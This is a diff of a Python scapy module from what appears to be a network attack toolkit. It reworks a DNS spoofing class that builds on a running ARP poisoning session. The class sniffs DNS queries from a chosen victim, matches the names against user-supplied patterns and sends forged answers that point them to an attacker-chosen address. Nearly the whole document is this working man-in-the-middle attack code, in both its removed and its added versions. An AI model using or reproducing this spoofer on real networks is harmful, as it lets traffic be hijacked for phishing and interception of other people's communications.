@@ -1,93 +1,124 @@
 import stream
+import util
+import re
 from scapy.all import *
+from poison import Poison
 from threading import Thread
 
-#
-# DEPRICATED; NOW A PART OF ARPSPOOF
-#
-class DNSSpoof:
+__name__='DNS Spoof'
+class DNSSpoof(Poison):
+	"""DNS spoofing class
+	"""
+
 	def __init__(self):
-		conf.verb = 0
-		self.spoofing = False
-		self.spoof_site = ''
-		self.redirect_to = ''
-		self.dump_data = False
+		self.dns_spoofed_pair = {}
+		self.dns_spoof = None
+		self.dump = False
+		self.source = None
+		self.local_mac = None
+		super(DNSSpoof,self).__init__('DNS Spoof')
 
-	#
-	#
-	#
-	def shutdown(self):
-		if not self.spoofing:
-			return
-		print '[dbg] initiating DNS shutdown'
-		self.spoofing = False
-		# we dont save the real DNSRR because we never actually send the DNSQR (tehe), 
-		# so we can't really rectify the attack.  Maybe we'll make the request for the user in
-		# the future to preserve it.  TODO
-		print '[dbg] DNS shutdown complete.'
-		return True
-	
-	#
-	#
-	#
-	def dns_stopper(self):
-		if self.spoofing:
-			return False
-		return True
-
-	#
-	# Initialize spoofing by gathering some information
-	#
 	def initialize(self):
+		"""Initialize the DNS spoofer.  This is dependent
+		   on a running ARP spoof; for now!
+		"""
 		try:
-			print '[!] Note: You should have an existing poisoning session running for this to work!'
-			self.spoof_site = raw_input('[!] Enter DNS record to spoof (site): ')
-			# it's the little things, you know?
-			self.redirect_to = raw_input('[!] Spoof DNS entry for %s to: '%self.spoof_site)
-			tmp =raw_input('[!] Spoof DNS record for %s to %s.  Is this correct? '%(self.spoof_site,self.redirect_to))
+			arps = None
+			key = None
+			if 'ARPSpoof' in stream.HOUSE:
+				house = stream.HOUSE['ARPSpoof']
+			else:
+				util.Error('ARP spoof required!')
+				return
+
+			while True:
+				stream.dump_module_sessions('ARPSpoof')
+				try:
+					num = int(raw_input('[number] > '))
+				except TypeError:
+					continue
+				if len(house.keys()) > num:
+					key = house.keys()[num]
+					arps = house[key]
+
+					self.source = arps.to_ip
+					self.local_mac = arps.local_mac
+					break
+				else:
+					return
+			
+			dns_name = raw_input('[!] Enter regex to match DNS:\t')
+			if dns_name in self.dns_spoofed_pair:
+				util.Msg('DNS is already being spoofed (%s).'%(self.dns_spoofed_pair[dns_name]))
+				return
+
+			dns_spoofed = raw_input('[!] Spoof DNS entry matching %s to:\t'%(dns_name))
+			tmp = raw_input('[!] Spoof DNS record \'%s\' to \'%s\'.  Is this correct?'%
+								(dns_name,dns_spoofed))
+
+			if 'n' in tmp.lower():
+				return
+
+			dns_name = re.compile(dns_name)
+			self.dns_spoofed_pair[dns_name] = dns_spoofed
+			self.dns_spoof = True
+
+			util.Msg('Starting DNS spoofer...')
+			thread = Thread(target=self.dns_sniffer)
+			thread.start()
+		except KeyboardInterrupt:
+			return None
+		except re.error:
+			util.Error('Invalid regex given.')
+			return None
 		except Exception, j:
-			print '[error]: ', j
+			util.Error('Error: %s'%j)
 			return None
-		if tmp == 'n':
-			return None
-		self.spoofing = True
-		print '[dbg] starting DNS poisoner...' 
-		dns_thread = Thread(target=self.spoof_handler)
-		dns_thread.start()
-		print '[dbg] poisoner running.'
-		# since we're poisoning all DNS requests coming through, just post up the redirection IP
-		return self.redirect_to
-	
-	#
-	#
-	#
-	def respoofer(self, pkt):
-		if DNSQR in pkt:
-			if self.dump_data: print '[!] DNSQR from ', pkt[DNSQR].qname
-			if self.spoof_site == pkt[DNSQR].qname:
-				p = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,type='A',rclass='IN',ttl=20000,rdata=self.redirect_to),qd=pkt[DNS].qd)
-#	p = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id)/DNSQR(qname=pkt[DNSQR].qname,qtype=pkt[DNSQR].qtype,qclass=pkt[DNSQR].qclass)/DNSRR(rdata=self.redirect_to)
-				send(p)
+		return self.source
+
+	def dns_sniffer(self):
+		"""Listen for DNS packets
+		"""
+		sniff(filter='udp and port 53 and src %s'%self.source,store=0,prn=self.spoof_dns,
+						stopper=self.test_stop, stopperTimeout=3)
+
+	def spoof_dns(self, pkt):
+		"""Receive packets and spoof if necessary
+		"""
+		if DNSQR in pkt and pkt[Ether].src != self.local_mac:
+			for dns in self.dns_spoofed_pair.keys():
+				tmp = dns.search(pkt[DNSQR].qname)
+				if not tmp is None and not tmp.group(0) is None:
+					p = Ether(dst=pkt[Ether].src, src=self.local_mac)
+					p /= IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)
+					p /= DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,
+											type='A',rclass='IN',ttl=40000,rdata=self.dns_spoofed_pair[dns]),
+											qd=pkt[DNS].qd)
+					sendp(p,count=1)
+					if self.dump: util.Msg('Caught request to %s'%pkt[DNSQR].qname)
 		del(pkt)
 	
-	#
-	#
-	#
-	def spoof_handler(self):
-		sniff(filter="udp and port 53", store=0,prn=self.respoofer, stopper=self.dns_stopper, stopperTimeout=3)
-	#
-	# Return whether or not the spoofer is running
-	#
-	def isRunning(self):
-		return self.spoofing is True
+	def test_stop(self):
+		"""Test if we're still spoofing
+		"""
+		if self.dns_spoof:
+			return False
+		util.debug('Stopping DNS spoofer...')
+		return True
 
-	#
-	#
-	#
-	def view(self):
-		try:
-			while True:
-				self.dump_data = True
-		except Exception:
-			self.dump_data = False
-			return
+	def shutdown(self):
+		"""Stop DNS spoofing
+		"""
+		if self.dns_spoof:
+			self.dns_spoof = False
+			self.dns_spoofed_pair.clear()
+			util.debug('DNS spoofing shutdown.')
+		return
+
+	def session_view(self):
+		""" Return what to print when viewing sessions
+		"""
+		data = self.source + '\n'
+		for (cnt,dns) in enumerate(self.dns_spoofed_pair):
+			data += '\t|-> [%d] %s -> %s\n'%(cnt, dns.pattern, self.dns_spoofed_pair[dns])
+		return data
